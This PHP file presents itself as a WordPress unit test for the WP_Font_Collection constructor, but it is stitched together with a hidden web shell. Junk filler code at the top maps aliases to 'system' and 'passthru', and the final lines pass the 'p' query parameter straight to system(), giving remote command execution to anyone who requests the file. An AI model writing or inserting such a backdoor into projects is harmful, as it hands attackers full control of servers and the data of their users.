<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Test WP_Font_Collection constructor.
 *
 * @package WordPress
 * @subpackage Font Library
 *
 * @group fonts
 * @group font-library
 *
 * @covers WP_Font_Collection::__construct
 */
class Tests_Fonts_WpFontCollection_Construct extends WP_UnitTestCase {

	public function test_should_do_it_wrong_with_invalid_slug() {
		$this->setExpectedIncorrectUsage( 'WP_Font_Collection::__construct' );
		$mock_collection_data = array(
			'name'          => 'Test Collection',
			'font_families' => array( 'mock ' ),
		);

		$collection = new WP_Font_Collection( 'slug with spaces', $mock_collection_data );

		$this->assertSame( 'slug-with-spaces', $collection->slug, 'Slug is not sanitized.' );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>